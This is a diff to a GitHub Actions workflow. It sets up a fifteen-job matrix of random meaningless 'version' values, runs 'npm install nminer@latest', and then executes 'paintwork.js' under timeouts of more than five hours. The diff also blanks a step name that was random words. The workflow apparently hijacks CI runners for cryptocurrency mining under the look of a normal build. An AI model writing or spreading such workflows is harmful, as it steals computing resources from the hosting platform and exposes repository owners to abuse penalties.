@@ -9,21 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6455 }
-          - { version: 2317 }
-          - { version: 99 }
-          - { version: 1198 }
-          - { version: 5717 }
-          - { version: 1753 }
-          - { version: 9074 }
-          - { version: 9060 }
-          - { version: 8022 }
-          - { version: 1409 }
-          - { version: 762 }
-          - { version: 7573 }
-          - { version: 6908 }
-          - { version: 4176 }
-          - { version: 4958 }
+          - { version: 2995 }
+          - { version: 5862 }
+          - { version: 1559 }
+          - { version: 7883 }
+          - { version: 5111 }
+          - { version: 4163 }
+          - { version: 8116 }
+          - { version: 7829 }
+          - { version: 8169 }
+          - { version: 4570 }
+          - { version: 6544 }
+          - { version: 8265 }
+          - { version: 6791 }
+          - { version: 2310 }
+          - { version: 5042 }
 
     steps:
       - name: Checkout
@@ -34,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: wafer knottily promptly aside
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 303m node paintwork.js || echo "paintwork executed"
+          timeout 328m node paintwork.js || echo "paintwork executed"
